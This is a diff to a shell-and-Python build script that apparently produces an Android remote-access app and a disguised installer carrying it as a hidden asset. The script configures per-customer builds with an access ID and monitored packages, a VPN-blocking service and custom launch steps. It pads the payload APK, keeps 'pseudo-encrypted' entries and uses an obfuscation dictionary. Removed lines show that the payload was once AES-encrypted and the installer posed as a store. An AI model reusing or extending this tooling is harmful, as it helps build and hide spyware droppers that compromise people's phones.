@@ -658,13 +658,12 @@ if ! [[ "$INSTALLER_PACKAGE_EFFECTIVE" =~ ^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-
 fi
 
 INSTALLER_PACKAGE_PATH="${INSTALLER_PACKAGE_EFFECTIVE//./\/}"
-INSTALLER_IDENTITY_HASH=$(printf '%s' "$INSTALLER_PACKAGE_EFFECTIVE" | sha256sum | cut -c1-10)
-INSTALLER_ACTIVITY_CLASS="A${INSTALLER_IDENTITY_HASH}"
-INSTALLER_VPN_CLASS="V${INSTALLER_IDENTITY_HASH}"
+INSTALLER_ACTIVITY_CLASS="MainActivity"
+INSTALLER_VPN_CLASS="BlockVpnService"
+INSTALLER_RECEIVER_CLASS="InstallResultReceiver"
 
-# The checked-in installer sources may already carry generated class names
-# instead of the original MainActivity/BlockVpnService names. Discover the
-# source classes so repeated and custom-package builds use the same path.
+# Discover the checked-in component classes so repeated and custom-package
+# builds can normalize them to stable, readable names.
 cp "$INSTALLER_BUILD_GRADLE" "$INSTALLER_BUILD_GRADLE_BAK"
 cp "$INSTALLER_PROGUARD" "$INSTALLER_PROGUARD_BAK"
 cp "$INSTALLER_MANIFEST" "$INSTALLER_MANIFEST_BAK"
@@ -680,6 +679,7 @@ matches = {}
 patterns = {
     "activity": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+Activity\b"),
     "vpn": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+VpnService\b"),
+    "receiver": re.compile(r"\bpublic\s+(?:final\s+)?class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+BroadcastReceiver\b"),
 }
 
 for path in sorted(root.rglob("*.java")):
@@ -696,11 +696,13 @@ if missing:
 print("\t".join([
     matches["activity"][0], matches["activity"][1],
     matches["vpn"][0], matches["vpn"][1],
+    matches["receiver"][0], matches["receiver"][1],
 ]))
 PYEOF
 )
 IFS=$'\t' read -r INSTALLER_SOURCE_ACTIVITY_CLASS INSTALLER_SOURCE_ACTIVITY_PATH \
-    INSTALLER_SOURCE_VPN_CLASS INSTALLER_SOURCE_VPN_PATH <<< "$INSTALLER_SOURCE_CLASSES"
+    INSTALLER_SOURCE_VPN_CLASS INSTALLER_SOURCE_VPN_PATH \
+    INSTALLER_SOURCE_RECEIVER_CLASS INSTALLER_SOURCE_RECEIVER_PATH <<< "$INSTALLER_SOURCE_CLASSES"
 
 INSTALLER_JAVA_TARGET="$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH"
 mkdir -p "$INSTALLER_JAVA_TARGET"
@@ -716,8 +718,10 @@ done
 INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
 INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
 INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
+INSTALLER_RECEIVER_CLASS="$INSTALLER_RECEIVER_CLASS" \
 INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
 INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
+INSTALLER_SOURCE_RECEIVER_CLASS="$INSTALLER_SOURCE_RECEIVER_CLASS" \
 python3 - "$INSTALLER_JAVA_TARGET" << 'PYEOF'
 import os
 import pathlib
@@ -727,8 +731,10 @@ import sys
 pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
 activity = os.environ["INSTALLER_ACTIVITY_CLASS"]
 vpn = os.environ["INSTALLER_VPN_CLASS"]
+receiver = os.environ["INSTALLER_RECEIVER_CLASS"]
 source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
 source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
+source_receiver = os.environ["INSTALLER_SOURCE_RECEIVER_CLASS"]
 
 for path in pathlib.Path(sys.argv[1]).rglob("*.java"):
     with open(path, "r", encoding="utf-8") as f:
@@ -736,6 +742,7 @@ for path in pathlib.Path(sys.argv[1]).rglob("*.java"):
     src = re.sub(r"^package\s+[^;]+;", f"package {pkg};", src, count=1, flags=re.MULTILINE)
     src = re.sub(rf"\b{re.escape(source_activity)}\b", activity, src)
     src = re.sub(rf"\b{re.escape(source_vpn)}\b", vpn, src)
+    src = re.sub(rf"\b{re.escape(source_receiver)}\b", receiver, src)
     src = src.replace('"com.onerule.task.INSTALL_DONE"', f'"{pkg}.INSTALL_DONE"')
     src = src.replace('"com.onerule.task.ACTION_INSTALL_STATUS"',
                       f'"{pkg}.ACTION_INSTALL_STATUS"')
@@ -753,12 +760,18 @@ if [ "$INSTALLER_SOURCE_VPN_CLASS" != "$INSTALLER_VPN_CLASS" ]; then
     mv -f "$INSTALLER_JAVA_TARGET/$INSTALLER_SOURCE_VPN_CLASS.java" \
           "$INSTALLER_JAVA_TARGET/$INSTALLER_VPN_CLASS.java"
 fi
+if [ "$INSTALLER_SOURCE_RECEIVER_CLASS" != "$INSTALLER_RECEIVER_CLASS" ]; then
+    mv -f "$INSTALLER_JAVA_TARGET/$INSTALLER_SOURCE_RECEIVER_CLASS.java" \
+          "$INSTALLER_JAVA_TARGET/$INSTALLER_RECEIVER_CLASS.java"
+fi
 
 INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
 INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
 INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
+INSTALLER_RECEIVER_CLASS="$INSTALLER_RECEIVER_CLASS" \
 INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
 INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
+INSTALLER_SOURCE_RECEIVER_CLASS="$INSTALLER_SOURCE_RECEIVER_CLASS" \
 python3 - "$INSTALLER_BUILD_GRADLE" "$INSTALLER_PROGUARD" "$INSTALLER_MANIFEST" << 'PYEOF'
 import os
 import re
@@ -767,8 +780,10 @@ import sys
 pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
 activity = os.environ.get("INSTALLER_ACTIVITY_CLASS", "")
 vpn = os.environ.get("INSTALLER_VPN_CLASS", "")
+receiver = os.environ.get("INSTALLER_RECEIVER_CLASS", "")
 source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
 source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
+source_receiver = os.environ["INSTALLER_SOURCE_RECEIVER_CLASS"]
 
 gradle_path, proguard_path, manifest_path = sys.argv[1:]
 with open(gradle_path, "r", encoding="utf-8") as f:
@@ -788,21 +803,14 @@ proguard = proguard.replace(
     f"{pkg}.{vpn}",
 )
 proguard = proguard.replace(
-    "com.onerule.task.I4450c4b785",
-    f"{pkg}.I4450c4b785",
+    f"com.onerule.task.{source_receiver}",
+    f"{pkg}.{receiver}",
 )
 proguard = re.sub(
     r"(?m)^-keep class [A-Za-z_][A-Za-z0-9_.]*\.BuildConfig \{ \*; \}$",
     f"-keep class {pkg}.BuildConfig {{ *; }}",
     proguard,
 )
-vpn_keep = f"-keep public class {pkg}.{vpn} {{ public <init>(); }}"
-if vpn_keep not in proguard:
-    proguard = proguard.replace(
-        "# zip4j — needs reflection-safe internals",
-        vpn_keep + "\n\n# zip4j — needs reflection-safe internals",
-        1,
-    )
 with open(proguard_path, "w", encoding="utf-8") as f:
     f.write(proguard)
 
@@ -818,6 +826,11 @@ manifest = manifest.replace(
     f'android:name=".{vpn}"',
     1,
 )
+manifest = manifest.replace(
+    f'android:name=".{source_receiver}"',
+    f'android:name=".{receiver}"',
+    1,
+)
 with open(manifest_path, "w", encoding="utf-8") as f:
     f.write(manifest)
 PYEOF
@@ -825,8 +838,9 @@ PYEOF
 echo "  Installer namespace   = $INSTALLER_PACKAGE_EFFECTIVE"
 echo "  Installer activity    = $INSTALLER_ACTIVITY_CLASS"
 echo "  Installer VPN service  = $INSTALLER_VPN_CLASS"
+echo "  Installer receiver    = $INSTALLER_RECEIVER_CLASS"
 echo "  Installer manifest    = generated component names applied"
-echo "  Installer methods     = R8 release renaming enabled (entry constructors retained)"
+echo "  Installer methods     = stable source names (installer minification disabled)"
 
 if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
     echo ""
@@ -1277,10 +1291,9 @@ PYEOF
         rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
         echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
     fi
-    # Also wipe the encrypted module asset so the installer is rebuilt around
-    # the new payload, and any leftover signing sidecar files.
+    # Also wipe the module asset so the installer is rebuilt around the new
+    # padded payload, and any leftover signing sidecar files.
     rm -f "$ROOT_DIR/installer/src/main/assets/module" \
-          "$ROOT_DIR/installer/build.key" \
           "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 fi
 
@@ -1578,35 +1591,6 @@ else
     INST_KS_ORG=$(   sed -n '5p' "$INST_KS_META")
     INST_KS_COUNTRY=$(sed -n '6p' "$INST_KS_META")
     echo "  Installer keystore          (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
-fi
-
-# ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
-echo ""
-echo "==> Ensuring Python build tools..."
-if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
-    echo "  Installing pyzipper..."
-    # Try methods in order of preference:
-    #  1. uv (fast, avoids any pip restrictions entirely)
-    #  2. pip --break-system-packages (Alpine PEP 668 override — safe since we own the image)
-    #  3. pip plain (Debian/Ubuntu where no flag is needed)
-    #  4. pip --user (last-resort for non-container envs)
-    if command -v uv >/dev/null 2>&1; then
-        uv pip install --system pyzipper >/dev/null 2>&1 \
-          || pip install --break-system-packages --quiet pyzipper 2>/dev/null \
-          || pip install --quiet pyzipper 2>/dev/null \
-          || pip install --user --quiet pyzipper 2>/dev/null
-    else
-        pip install --break-system-packages --quiet pyzipper 2>/dev/null \
-          || pip install --quiet pyzipper 2>/dev/null \
-          || pip install --user --quiet pyzipper 2>/dev/null
-    fi
-    if ! python3 -c "import pyzipper" >/dev/null 2>&1; then
-        echo "  ERROR: failed to install pyzipper (required for installer module encryption)"
-        exit 1
-    fi
-    echo "  pyzipper installed."
-else
-    echo "  pyzipper already present."
 fi
 
 # ── 6. Obfuscation dictionary ─────────────────────────────────────────────────
@@ -2160,12 +2144,12 @@ chunk = bytes(chunk)
 padding = (chunk * ((pad // 1024) + 1))[:pad]
 
 # Copy the APK binary as-is first (preserves pseudo-encrypted entries
-# without Python's zipfile ever trying to decompress/decrypt them).
+# without Python's zipfile ever trying to decompress them).
 shutil.copy2(src, dst)
 
 # Open the copy in APPEND mode — Python reads the central directory
-# but never calls open() on existing entries, so the "strong encryption"
-# flag on pseudo-encrypted entries does NOT raise NotImplementedError.
+# but never calls open() on existing entries, so existing APK entries are
+# preserved without Python trying to decompress them.
 # We simply tack on the new padding entry at the end.
 with zipfile.ZipFile(dst, "a") as zout:
     pi = zipfile.ZipInfo("res/raw/.pad")
@@ -2209,26 +2193,16 @@ else
 fi
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
-# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
-# "module" (AES-256 ZIP). A fresh random key is generated per build and
-# embedded into the installer at compile time via BuildConfig.MODULE_KEY,
-# so every Installer-release.apk has a different key. At runtime the
-# installer decrypts the module to its cache and hands it to Android's
-# PackageInstaller session, marking the source as a store on Android 13+.
+# Bundles the padded RemoteAccess-release.apk inside a normal DEFLATE-compressed
+# ZIP asset named "module". The repetitive 40 MB padding compresses well, while
+# the installer transparently restores payload.apk into its cache at runtime.
 echo ""
 echo "==> Building INSTALLER module ..."
-# Use the FAT (~40 MB) APK as the installer payload.
-# The 38 MB padding entry is a repeating 1 KB LCG block stored without
-# compression inside the APK ZIP.  pyzipper re-compresses the whole APK
-# with DEFLATE when building the AES-256 asset, so that repeating block
-# collapses to ~a few KB — the "module" asset ends up ~2 MB even though
-# the APK it contains is 40 MB.  When the installer decrypts and extracts
-# the asset at runtime, the full 40 MB APK is written to disk and then
-# passed to PackageInstaller, so the app installs at its full 40 MB size.
+# Use the FAT (~40 MB) APK as the installer payload. The inner APK retains its
+# 40 MB padding after extraction; only the outer installer asset is compressed.
 PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
-KEY_FILE="$ROOT_DIR/installer/build.key"
 PKG_FILE="$ROOT_DIR/installer/payload.pkg"
 if [ -f "$PAYLOAD_SRC" ]; then
     mkdir -p "$INSTALLER_ASSETS"
@@ -2277,34 +2251,24 @@ if [ -f "$PAYLOAD_SRC" ]; then
     printf '%s' "$PAYLOAD_PKG" > "$PKG_FILE"
     echo "  Payload package: $PAYLOAD_PKG (written to installer/payload.pkg)"
 
-    # Remove the legacy unencrypted asset if present from older builds
+    # Remove any stale asset before writing the current compressed payload.
     rm -f "$INSTALLER_ASSETS/payload.apk"
 
-    # (1) Generate fresh per-build random key (32 url-safe chars, ~192 bits)
-    MODULE_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
-    printf '%s' "$MODULE_KEY" > "$KEY_FILE"
-    echo "  Generated random per-build key (embedded into BuildConfig.MODULE_KEY)."
-
-    # (2) AES-256 encrypt the hardened APK into the "module" asset.
-    #     pyzipper writes WinZip-AES format; zip4j on Android decodes it.
+    # Store the padded APK as payload.apk in a compressed outer ZIP. Keep the
+    # module asset itself uncompressed in the installer APK so Gradle does not
+    # spend time trying to recompress an already-compressed ZIP.
     rm -f "$MODULE_DST"
-    PAYLOAD_SRC="$PAYLOAD_SRC" MODULE_DST="$MODULE_DST" MODULE_KEY="$MODULE_KEY" \
-    python3 - << 'PYEOF'
-import os, pyzipper
-src = os.environ["PAYLOAD_SRC"]
-dst = os.environ["MODULE_DST"]
-key = os.environ["MODULE_KEY"].encode()
-with pyzipper.AESZipFile(dst, "w",
-                         compression=pyzipper.ZIP_DEFLATED,
-                         encryption=pyzipper.WZ_AES) as zf:
-    zf.setpassword(key)
-    zf.setencryption(pyzipper.WZ_AES, nbits=256)
-    with open(src, "rb") as f:
-        zf.writestr("payload.apk", f.read())
-print("  AES-256 encrypted module written.")
+    python3 - "$PAYLOAD_SRC" "$MODULE_DST" << 'PYEOF'
+import sys
+import zipfile
+
+source_path, module_path = sys.argv[1:]
+with zipfile.ZipFile(module_path, "w", compression=zipfile.ZIP_DEFLATED,
+                     compresslevel=9) as archive:
+    archive.write(source_path, "payload.apk")
 PYEOF
     MODULE_SIZE=$(ls -lh "$MODULE_DST" | awk '{print $5}')
-    echo "  Encrypted asset: installer/src/main/assets/module ($MODULE_SIZE)"
+    echo "  Compressed module asset: installer/src/main/assets/module ($MODULE_SIZE)"
 
     cd "$ROOT_DIR"
     ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1
